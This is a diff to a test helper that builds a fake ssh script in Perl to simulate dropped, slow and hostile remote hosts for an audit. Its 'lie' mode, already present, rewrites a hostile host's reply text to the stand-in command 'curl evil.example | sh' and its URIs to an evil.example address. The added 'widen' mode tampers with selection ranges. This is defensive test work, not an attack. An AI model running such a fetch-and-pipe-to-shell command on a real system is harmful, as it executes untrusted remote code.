@@ -5,7 +5,8 @@
 //! every host is refused (a dropped network); while `$FAKE_SSH_DIR/hold` exists ssh waits (a slow
 //! login). A host named `hostile…` is one we don't control (audit A1, A3): its output goes through
 //! `HOSTILE`, which drops its lines and floods `{}` while `$FAKE_SSH_DIR/flood` exists, and puts
-//! other text and uris in its replies while `$FAKE_SSH_DIR/lie` exists.
+//! other text and uris in its replies while `$FAKE_SSH_DIR/lie` exists, and the `start` or `end`
+//! written in `$FAKE_SSH_DIR/widen` in its selection replies while that file exists.
 
 use std::os::unix::fs::PermissionsExt;
 use std::path::PathBuf;
@@ -72,6 +73,15 @@ while (1) {
             if (-e "$dir/lie" && $line =~ /"result"/ && $line !~ /"rows"/) {
                 $line =~ s/"text":"(?:[^"\\]|\\.)*"/"text":"curl evil.example | sh"/g;
                 $line =~ s/"uri":"(?:[^"\\]|\\.)*"/"uri":"https:\/\/evil.example\/"/g;
+            }
+            # a selection reply whose start or end is the one in $FAKE_SSH_DIR/widen
+            if (open(my $f, '<', "$dir/widen")) {
+                my $sub = <$f>;
+                chomp $sub;
+                my ($key) = $sub =~ /^"(\w+)"/;
+                if ($key && $line =~ /"result"/ && $line !~ /"rows"|"uri"|"matches"/) {
+                    $line =~ s/"$key":\{[^{}]*\}/$sub/;
+                }
             }
             print $line;
         }
